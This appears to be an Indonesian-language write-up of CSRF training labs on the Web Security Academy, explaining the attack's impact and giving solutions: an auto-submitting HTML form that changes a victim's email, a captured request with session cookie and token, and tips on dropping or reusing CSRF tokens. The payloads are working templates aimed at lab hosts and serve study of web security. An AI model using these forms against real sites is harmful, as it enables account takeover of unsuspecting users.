	
## Apa dampak serangan CSRF?

Dalam serangan CSRF yang berhasil, penyerang menyebabkan pengguna korban melakukan suatu tindakan secara tidak sengaja. Misalnya saja untuk mengubah alamat email di akun mereka, mengubah kata sandi, atau melakukan transfer dana. Bergantung pada sifat tindakannya, penyerang mungkin bisa mendapatkan kendali penuh atas akun pengguna. Jika pengguna yang disusupi memiliki peran istimewa dalam aplikasi, maka penyerang mungkin dapat mengambil kendali penuh atas semua data dan fungsionalitas aplikasi.


**solve lab 1 :**

```html
<html>
    <body>
        <form id="autoSubmitForm" method="POST" action="https://0ac60036041c9017801a5856008500fe.web-security-academy.net/my-account/change-email">
        <input type="hidden" name="email" value="juh@normal-user.net"/>
    </form>
    
    <script>
        document.getElementById("autoSubmitForm").submit();
    </script>
    </body>
</html>
```



**Solve lab2:**

```json
GET /my-account/change-email?email=admin%40normal-user.net&csrf=CQQbYkMfwphjikTc2tzP8cqIoH5TnQ8Z HTTP/1.1
Host: 0aad0078047668a58591d1cf005c00b9.web-security-academy.net
Cookie: session=kFEbom06VJPPjxaKhWPGNwoL3SroWH6x
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aad0078047668a58591d1cf005c00b9.web-security-academy.net/my-account?id=wiener
Origin: https://0aad0078047668a58591d1cf005c00b9.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: close
```

```html
<html>
	<body>
		<form method="GET" action="https://0aad0078047668a58591d1cf005c00b9.web-security-academy.net/my-account/change-email?email=admin%40normal-user.net&csrf=CQQbYkMfwphjikTc2tzP8cqIoH5TnQ8Z">
			<input type="hidden" name="email" value="admin%40normal-user.net"/>
			<input type="hidden" name="csrf" value="CQQbYkMfwphjikTc2tzP8cqIoH5TnQ8Z"/>
			<input type="submit" value="Submit">
		</form>
	</body>
<html>
```


**Solve lab3:**
hanya menghapus token csrf nya saja, tinggal gmail lalu kirim dan boom 


**Solve lab4:**

di sini saya harus menggunakan 2 browser 1. untuk kirim email change yang ke 2. untuk generate token csrf. 

